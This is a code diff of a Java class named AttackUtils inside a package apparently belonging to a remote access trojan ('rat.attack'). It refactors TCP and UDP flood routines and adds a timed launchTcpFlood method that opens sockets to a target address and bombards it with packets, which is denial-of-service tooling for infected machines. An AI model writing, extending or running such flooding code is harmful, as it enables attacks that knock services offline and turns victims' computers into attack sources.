@@ -1,8 +1,6 @@
 package de.sogomn.rat.attack;
 
-import java.io.IOException;
 import java.io.OutputStream;
-import java.net.BindException;
 import java.net.DatagramPacket;
 import java.net.DatagramSocket;
 import java.net.InetSocketAddress;
@@ -11,13 +9,13 @@ import java.net.Socket;
 public final class AttackUtils {
 	
 	private static final int TCP_INTERVAL = 1;
-	private static final int UDP_INTERVAL = 150;
+	private static final int WAVE_INTERVAL = 500;
 	
 	private AttackUtils() {
 		//...
 	}
 	
-	public static void launchTcpWave(final String address, final int port, final int threads) {
+	public static void launchTcpWave(final String address, final int port) {
 		final Runnable runnable = () -> {
 			try {
 				final Socket socket = new Socket(address, port);
@@ -34,21 +32,16 @@ public final class AttackUtils {
 				
 				out.close();
 				socket.close();
-			} catch (final InterruptedException ex) {
-				ex.printStackTrace();
-			} catch (final IOException ex) {
-				System.err.println(ex.getMessage());
+			} catch (final Exception ex) {
+				System.err.println(ex);
 			}
 		};
+		final Thread thread = new Thread(runnable);
 		
-		for (int i = 0; i < threads; i++) {
-			final Thread thread = new Thread(runnable);
-			
-			thread.start();
-		}
+		thread.start();
 	}
 	
-	public static void launchUdpWave(final String address, final int threads) {
+	public static void launchUdpWave(final String address) {
 		final Runnable runnable = () -> {
 			/*65535 = Max port*/
 			final int port = (int)(Math.random() * 65534) + 1;
@@ -61,17 +54,26 @@ public final class AttackUtils {
 				
 				socket.send(packet);
 				socket.close();
-			} catch (final BindException ex) {
-				System.err.println(ex.getMessage());
-			} catch (final IOException ex) {
-				ex.printStackTrace();
+			} catch (final Exception ex) {
+				System.err.println(ex);
 			}
 		};
+		final Thread thread = new Thread(runnable);
 		
-		for (int i = 0; i < threads; i++) {
-			final Thread thread = new Thread(runnable);
+		thread.start();
+	}
+	
+	public static void launchTcpFlood(final String address, final int port, final long milliseconds) {
+		final long time = System.currentTimeMillis();
+		
+		while (System.currentTimeMillis() - time <= milliseconds) {
+			launchTcpWave(address, port);
 			
-			thread.start();
+			try {
+				Thread.sleep(WAVE_INTERVAL);
+			} catch (final InterruptedException ex) {
+				ex.printStackTrace();
+			}
 		}
 	}
 	
@@ -79,10 +81,10 @@ public final class AttackUtils {
 		final long time = System.currentTimeMillis();
 		
 		while (System.currentTimeMillis() - time < milliseconds) {
-			launchUdpWave(address, 1);
+			launchUdpWave(address);
 			
 			try {
-				Thread.sleep(UDP_INTERVAL);
+				Thread.sleep(WAVE_INTERVAL);
 			} catch (final InterruptedException ex) {
 				ex.printStackTrace();
 			}
